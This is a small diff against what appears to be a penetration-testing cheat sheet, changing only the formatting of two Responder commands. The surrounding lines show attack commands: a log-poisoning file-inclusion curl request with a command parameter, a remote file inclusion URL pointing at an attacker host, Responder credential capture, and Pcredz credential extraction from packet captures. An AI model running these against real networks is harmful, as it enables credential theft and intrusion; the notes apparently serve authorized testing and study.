@@ -1010,7 +1010,7 @@ $ curl -s "http://<IP address>/lang.php?page=C:/xampp/apache/logs/access.log&c=w
 - Remote File Inclusion (RFI)
 
 ```
-sudo responder -I <network interface>
+$ sudo responder -I <network interface>
 http://<domain name>/<page>?page=//<IP address>/somefile
 ```
 
@@ -3578,7 +3578,7 @@ $ ./Pcredz -f demo.pcapng -t -v
 ```
 https://github.com/lgandx/Responder
 https://github.com/lgandx/Responder-Windows
-sudo responder -I ens224 -A
+$ sudo responder -I ens224 -A
 ```
 
 - Inveigh
